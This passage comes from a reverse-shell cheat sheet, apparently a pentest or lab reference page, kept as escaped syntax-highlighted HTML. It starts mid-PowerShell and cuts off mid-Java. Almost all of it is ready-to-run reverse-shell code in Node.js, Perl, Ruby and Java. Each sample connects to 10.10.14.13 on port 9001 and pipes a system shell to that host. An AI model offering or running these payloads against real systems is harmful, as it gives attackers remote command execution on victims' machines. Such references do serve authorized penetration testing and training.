class=\"nv\"\u003e$sendback2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eWrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendbyte\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sendbyte\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eLength\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eFlush\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$client\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eClose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"nodejs-reverse-shells\"\u003eNode.js Reverse Shells\u003c/h2\u003e\n\u003ch3 id=\"basic-nodejs\"\u003eBasic Node.js\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e \u003cspan class=\"nx\"\u003eSimple\u003c/span\u003e \u003cspan class=\"nx\"\u003eNode\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e \u003cspan class=\"nx\"\u003ereverse\u003c/span\u003e \u003cspan class=\"nx\"\u003eshell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003enode\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;nc -e /bin/sh 10.10.14.13 9001\u0026#39;)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e \u003cspan class=\"nx\"\u003ePure\u003c/span\u003e \u003cspan class=\"nx\"\u003eNode\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e \u003cspan class=\"nx\"\u003eimplementation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003enet\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;net\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003ecp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;child_process\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003esh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003espawn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/bin/sh\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003enet\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003econnect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e9001\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;10.10.14.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epipe\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esh\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estdin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003esh\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epipe\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003esh\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epipe\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"sr\"\u003e/a/\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e})();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"other-language-shells\"\u003eOther Language Shells\u003c/h2\u003e\n\u003ch3 id=\"perl\"\u003ePerl\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-perl\" data-lang=\"perl\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Perl reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eperl\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;use Socket;$i=\u0026#34;10.10.14.13\u0026#34;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Alternative Perl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eperl\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eMIO\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\u0026#34;10.10.14.13:9001\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ruby\"\u003eRuby\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Ruby reverse shell\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eruby\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ersocket\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;f=TCPSocket.open(\u0026#34;10.10.14.13\u0026#34;,9001).to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Alternative Ruby\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eruby\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ersocket\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;exit if fork;c=TCPSocket.new(\u0026#34;10.10.14.13\u0026#34;,\u0026#34;9001\u0026#34;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"java\"\u003eJava\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eJava\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ereverse\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eshell\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003ejava.io.*\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003ejava.net.*\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eReverseShell\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003estatic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eException\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eSocket\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;10.10.14.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e9001\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eProcess\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eRuntime\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetRuntime\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;/bin/bash\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eInputStream\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epi\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInputStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eInputStream\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epe\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetErrorStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eInputStream\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003esi\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInputStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eOutputStream\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epo\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetOutputStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003eOutputStream\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eso\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetOutputStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eisClosed\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epi\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eavailable\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eso\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epi\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eavailable\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eso\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epe\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esi\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eavailable\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003epo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esi\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"n\"\u003eso\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eflush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"n\"\u003epo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eflush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"n\"\u003eThread\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 